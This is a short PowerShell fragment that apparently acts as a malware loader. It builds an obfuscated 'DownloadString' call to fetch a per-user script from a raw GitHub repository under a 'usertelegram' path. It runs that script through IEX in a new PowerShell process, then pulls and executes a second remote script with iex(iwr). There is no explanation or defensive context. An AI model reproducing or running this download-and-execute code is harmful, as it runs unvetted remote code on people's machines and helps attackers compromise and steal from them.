$codeuser = ("https://raw.githubusercontent.com/43a1723/test/main/usertelegram/$userid/main.ps1")
$downloaduser = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$codeuser')"
Start-Process "powershell" -Argument "`$userid=$userid;IEX($downloaduser)"
iex (iwr -uri "https://raw.githubusercontent.com/43a1723/test/main/Extras/download.ps1" -useb)
